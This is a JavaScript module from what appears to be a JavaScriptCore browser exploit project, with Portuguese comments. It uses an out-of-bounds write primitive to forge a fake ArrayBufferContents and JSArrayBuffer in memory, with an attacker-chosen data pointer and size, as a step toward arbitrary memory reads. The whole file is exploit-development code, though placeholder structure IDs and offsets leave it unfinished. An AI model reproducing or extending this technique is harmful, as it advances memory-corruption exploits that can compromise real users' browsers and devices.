// js/script3/testFakeArrayBufferCraft.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export async function executeFakeArrayBufferCraftTest() {
    const FNAME_TEST = "executeFakeArrayBufferCraftTest";
    logS3(`--- Iniciando Teste: Construção de Estruturas Fake ArrayBuffer ---`, "test", FNAME_TEST);
    document.title = `Craft Fake AB Structures`;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Teste abortado.", "error", FNAME_TEST);
        return;
    }

    // --- Configuração das Estruturas Falsas ---
    const fake_ArrayBufferContents_offset_in_oob = 0x100;
    const fake_JSArrayBuffer_offset_in_oob = 0x200;

    // CORREÇÃO APLICADA AQUI:
    const target_read_address_str = "0x0000004242420000"; // Exemplo: 0x4242000042420000 (high, low)
    const target_read_address = new AdvancedInt64(target_read_address_str);
    const read_size_val = 0x1000; // Para o construtor de AdvancedInt64 que espera um número
    const read_size = new AdvancedInt64(read_size_val, 0);


    logS3(`Construindo ArrayBufferContents Falsa em oob_ab_real[${toHex(fake_ArrayBufferContents_offset_in_oob)}]`, "info", FNAME_TEST);
    logS3(`  Target m_dataPointer: ${target_read_address.toString(true)} (de string: "${target_read_address_str}")`, "info", FNAME_TEST);
    logS3(`  Target m_sizeInBytes: ${read_size.toString(true)} (de valor: ${toHex(read_size_val)} bytes)`, "info", FNAME_TEST);

    // Escrever m_sizeInBytes (offset 0x8 dentro de ArrayBufferContents)
    try {
        // Para AdvancedInt64, o segundo argumento de oob_write_absolute é o próprio objeto AdvancedInt64
        oob_write_absolute(fake_ArrayBufferContents_offset_in_oob + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, read_size, 8);
        logS3(`   Campo m_sizeInBytes escrito em +${toHex(JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START)}`, "good", FNAME_TEST);
    } catch (e) { logS3(`   ERRO ao escrever m_sizeInBytes: ${e.message}`, "error", FNAME_TEST); }

    // Escrever m_dataPointer (offset 0x10 dentro de ArrayBufferContents)
    try {
        oob_write_absolute(fake_ArrayBufferContents_offset_in_oob + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, target_read_address, 8);
        logS3(`   Campo m_dataPointer escrito em +${toHex(JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START)}`, "good", FNAME_TEST);
    } catch (e) { logS3(`   ERRO ao escrever m_dataPointer: ${e.message}`, "error", FNAME_TEST); }

    try {
        oob_write_absolute(fake_ArrayBufferContents_offset_in_oob, AdvancedInt64.Zero, 8);
        logS3(`   Primeiros 8 bytes da ArrayBufferContents Falsa zerados.`, "info", FNAME_TEST);
    } catch (e) { logS3(`   ERRO ao zerar início da ArrayBufferContents: ${e.message}`, "error", FNAME_TEST); }


    logS3(`Construindo JSArrayBuffer Falso em oob_ab_real[${toHex(fake_JSArrayBuffer_offset_in_oob)}]`, "info", FNAME_TEST);

    const ArrayBuffer_STRUCTURE_ID_VALUE = JSC_OFFSETS.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID || 0x01082300; // Placeholder
    if (!JSC_OFFSETS.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
        logS3(`AVISO: Usando StructureID PLACEHOLDER ${toHex(ArrayBuffer_STRUCTURE_ID_VALUE)} para JSArrayBuffer! O objeto falso provavelmente não funcionará.`, "warn", FNAME_TEST);
    } else {
        logS3(`  Usando ArrayBuffer_STRUCTURE_ID: ${toHex(ArrayBuffer_STRUCTURE_ID_VALUE)}`, "info", FNAME_TEST);
    }

    try {
        // Escrever StructureID como DWORD
        oob_write_absolute(fake_JSArrayBuffer_offset_in_oob + 0x0, ArrayBuffer_STRUCTURE_ID_VALUE, 4);
        logS3(`   Campo StructureID (placeholder) escrito em +0x0`, "good", FNAME_TEST);
        // Zerar o campo Structure*
        oob_write_absolute(fake_JSArrayBuffer_offset_in_oob + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, AdvancedInt64.Zero, 8);
        logS3(`   Campo Structure* (em +${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)}) zerado.`, "info", FNAME_TEST);
    } catch (e) { logS3(`   ERRO ao escrever StructureID/Structure*: ${e.message}`, "error", FNAME_TEST); }

    // CORREÇÃO AQUI: pointer_to_fake_contents é um offset numérico, AdvancedInt64 o converte.
    const pointer_to_fake_contents_val = fake_ArrayBufferContents_offset_in_oob;
    const pointer_to_fake_contents = new AdvancedInt64(pointer_to_fake_contents_val, 0);
    logS3(`  Ponteiro (offset) para ArrayBufferContents Falsa: ${pointer_to_fake_contents.toString(true)} (de valor: ${toHex(pointer_to_fake_contents_val)})`, "info", FNAME_TEST);
    try {
        const offset_for_contents_ptr = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET;
        oob_write_absolute(fake_JSArrayBuffer_offset_in_oob + offset_for_contents_ptr, pointer_to_fake_contents, 8);
        logS3(`   Campo CONTENTS_IMPL_POINTER_OFFSET (em +${toHex(offset_for_contents_ptr)}) escrito com offset para fake contents.`, "good", FNAME_TEST);
        logS3(`     AVISO: Este é um OFFSET, não um endereço absoluto. Para funcionar, o motor JS precisaria de um endereço de memória real.`, "warn", FNAME_TEST);
    } catch (e) { logS3(`   ERRO ao escrever CONTENTS_IMPL_POINTER_OFFSET: ${e.message}`, "error", FNAME_TEST); }

    try {
        // Escrever o read_size_val (número) como um DWORD para o tamanho no JSArrayBuffer
        oob_write_absolute(fake_JSArrayBuffer_offset_in_oob + JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, read_size_val, 4);
        logS3(`   Campo SIZE_IN_BYTES (em +${toHex(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START)}) escrito com ${toHex(read_size_val)}.`, "good", FNAME_TEST);
    } catch (e) { logS3(`   ERRO ao escrever SIZE_IN_BYTES: ${e.message}`, "error", FNAME_TEST); }

    logS3(`--- Verificando Estruturas Falsas Escritas (lendo de volta com oob_read_absolute) ---`, "test", FNAME_TEST);

    try {
        const chk_size = oob_read_absolute(fake_ArrayBufferContents_offset_in_oob + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, 8);
        const chk_ptr = oob_read_absolute(fake_ArrayBufferContents_offset_in_oob + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, 8);
        logS3(`  FakeContents.m_sizeInBytes (lido): ${isAdvancedInt64Object(chk_size) ? chk_size.toString(true) : toHex(chk_size)} (esperado: ${read_size.toString(true)})`, "info", FNAME_TEST);
        logS3(`  FakeContents.m_dataPointer (lido): ${isAdvancedInt64Object(chk_ptr) ? chk_ptr.toString(true) : toHex(chk_ptr)} (esperado: ${target_read_address.toString(true)})`, "info", FNAME_TEST);
        if (isAdvancedInt64Object(chk_size) && chk_size.equals(read_size) && isAdvancedInt64Object(chk_ptr) && chk_ptr.equals(target_read_address)) {
            logS3("    Fake ArrayBufferContents parece ter sido escrita corretamente.", "good", FNAME_TEST);
        } else {
            logS3("    AVISO: Discrepância na verificação da Fake ArrayBufferContents.", "warn", FNAME_TEST);
        }
    } catch (e) { logS3(`  ERRO ao verificar FakeContents: ${e.message}`, "error", FNAME_TEST); }

    try {
        const chk_struct_id = oob_read_absolute(fake_JSArrayBuffer_offset_in_oob + 0x0, 4);
        const chk_contents_ptr_offset = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET;
        const chk_contents_ptr = oob_read_absolute(fake_JSArrayBuffer_offset_in_oob + chk_contents_ptr_offset, 8);
        logS3(`  FakeJSArrayBuffer.StructureID (lido): ${toHex(chk_struct_id)} (escrito: ${toHex(ArrayBuffer_STRUCTURE_ID_VALUE)})`, "info", FNAME_TEST);
        logS3(`  FakeJSArrayBuffer.contents_ptr (lido): ${isAdvancedInt64Object(chk_contents_ptr) ? chk_contents_ptr.toString(true) : toHex(chk_contents_ptr)} (escrito como offset: ${pointer_to_fake_contents.toString(true)})`, "info", FNAME_TEST);
        if (chk_struct_id === ArrayBuffer_STRUCTURE_ID_VALUE && isAdvancedInt64Object(chk_contents_ptr) && chk_contents_ptr.equals(pointer_to_fake_contents)) {
            logS3("    Fake JSArrayBuffer parece ter sido escrita corretamente (campos verificados).", "good", FNAME_TEST);
        } else {
            logS3("    AVISO: Discrepância na verificação do Fake JSArrayBuffer.", "warn", FNAME_TEST);
        }
    } catch (e) { logS3(`  ERRO ao verificar FakeJSArrayBuffer: ${e.message}`, "error", FNAME_TEST); }

    logS3(`--- Placeholder para teste de uso do ArrayBuffer Falso ---`, "info", FNAME_TEST);
    logS3(`   Neste ponto, precisaríamos de uma primitiva para fazer uma variável JS apontar para o endereço de memória de oob_ab_real[${toHex(fake_JSArrayBuffer_offset_in_oob)}].`, "warn", FNAME_TEST);
    logS3(`   E o StructureID ${toHex(ArrayBuffer_STRUCTURE_ID_VALUE)} precisaria ser o correto para o sistema.`, "warn", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste de Construção de Estruturas Fake ArrayBuffer CONCLUÍDO ---`, "test", FNAME_TEST);
    document.title = `Craft Fake AB Done`;
}
